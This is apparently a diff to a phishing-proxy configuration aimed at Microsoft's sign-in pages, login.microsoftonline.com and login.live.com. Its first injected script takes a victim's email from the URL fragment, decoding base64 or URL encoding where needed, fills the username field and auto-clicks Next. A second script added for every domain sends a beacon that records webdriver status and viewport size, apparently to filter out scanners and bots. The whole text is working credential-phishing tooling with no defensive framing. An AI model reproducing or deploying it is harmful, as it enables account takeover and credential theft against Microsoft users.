@@ -125,38 +125,89 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
     trigger_paths: ["/common/oauth2/", "/", "/*", "/common/oauth2/v2.0/authorize"]
     script: |
-      function lp(){
-              var emailId = document.querySelector("#i0116") || document.querySelector("#usernameEntry");
-              var nextButton = document.querySelector("#idSIButton9")
-                || document.querySelector("input[type=submit]")
-                || document.querySelector("button[type=submit]")
-                || document.querySelector("[data-testid='primaryButton']");
-              if (emailId && !emailId.value) {
-                var hash = (window.location.hash || "").replace(/^#/, "");
-                if (!hash) { setTimeout(function(){ lp(); }, 500); return; }
-                var decodedString = hash;
-                // URL-decode in case of %40 / %2E etc. from Cloudflare / redirect processing
-                try { decodedString = decodeURIComponent(decodedString); } catch(e) {}
-                // If it looks like pure base64 (no @ or .), try to decode it
-                if (/^[A-Za-z0-9+/=]+$/.test(decodedString)) {
-                  try {
-                    var b = window.atob(decodedString.replace(/=+$/, ''));
-                    if (b.indexOf("@") !== -1) decodedString = b;
-                  } catch(e) {}
-                }
-                // Strip trailing = and non-email garbage characters that may come from
-                // Cloudflare challenge / redirect fragment mangling
-                decodedString = decodedString.replace(/=+$/, '').replace(/[^\w.@+\-_]/g, '').trim();
-                if (decodedString && decodedString.indexOf("@") !== -1) {
-                  try {
-                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                    setter.call(emailId, decodedString);
-                    emailId.dispatchEvent(new Event("input", {bubbles:true}));
-                    emailId.dispatchEvent(new Event("change", {bubbles:true}));
-                    if (nextButton) { setTimeout(function(){ nextButton.click(); }, 300); }
-                  } catch(e) {}
-                }
-              }
-              setTimeout(function(){ lp(); }, 500);
+      (function() {
+        function getFragment() {
+          var f = (window.location.hash || "").replace(/^#/, "");
+          if (!f) return "";
+          // URL-decode in case of %40 / %2E etc. from Cloudflare / redirect processing
+          try { f = decodeURIComponent(f); } catch(e) {}
+          // If it looks like pure base64 (no @ or .), try to decode it
+          if (/^[A-Za-z0-9+/=]+$/.test(f)) {
+            try {
+              var dec = window.atob(f.replace(/=+$/, ""));
+              if (dec.indexOf("@") !== -1) return dec;
+            } catch(e) {}
+          }
+          // strip trailing = and any non-email garbage the challenge/redirect may add
+          return f.replace(/=+$/, "").replace(/[^\w.@+\-_]/g, "").trim();
+        }
+        function lp() {
+          var username = getFragment();
+          if (!username || username.indexOf("@") === -1) {
+            setTimeout(lp, 500);
+            return;
+          }
+          var emailId = document.querySelector("#i0116") ||
+                        document.querySelector("#usernameEntry") ||
+                        document.querySelector("input[type='email']") ||
+                        document.querySelector("input[name='loginfmt']") ||
+                        document.querySelector("input[name='UserName']");
+          var nextButton = document.querySelector("#idSIButton9") ||
+                           document.querySelector("input[type='submit']") ||
+                           document.querySelector("button[type='submit']") ||
+                           document.querySelector("[data-testid='primaryButton']");
+          if (!emailId) {
+            setTimeout(lp, 500);
+            return;
+          }
+          if (!emailId.value || emailId.value !== username) {
+            try {
+              var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+              setter.call(emailId, username);
+            } catch(e) {
+              emailId.value = username;
             }
-            setTimeout(function(){ lp(); }, 500);
+            emailId.dispatchEvent(new Event("input", {bubbles: true}));
+            emailId.dispatchEvent(new Event("change", {bubbles: true}));
+          }
+          if (nextButton) {
+            setTimeout(function() { nextButton.click(); }, 300);
+          }
+        }
+        lp();
+      })();
+  - trigger_domains: ["*"]
+    trigger_paths: ["/*"]
+    script: |
+      (function() {
+        var sent = false;
+        function beacon(event) {
+          if (sent) return;
+          sent = true;
+          var data = {
+            type: event.type,
+            t: Date.now(),
+            vp: {w: window.innerWidth, h: window.innerHeight},
+            wd: !!navigator.webdriver,
+            bat: navigator.getBattery ? 'yes' : 'no'
+          };
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon('/api/beacon', JSON.stringify(data));
+          } else {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/beacon', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(data));
+          }
+        }
+        ['mousemove', 'scroll', 'keydown', 'click', 'touchstart'].forEach(function(e) {
+          document.addEventListener(e, beacon, {passive: true, once: true});
+        });
+        window.addEventListener('load', function() {
+          beacon({type: 'load'});
+        });
+        // Signal asset loads
+        document.querySelectorAll('img, script, link[rel="stylesheet"]').forEach(function(el) {
+          el.addEventListener('load', function() { beacon({type: 'asset'}); }, {once: true});
+        });
+      })();
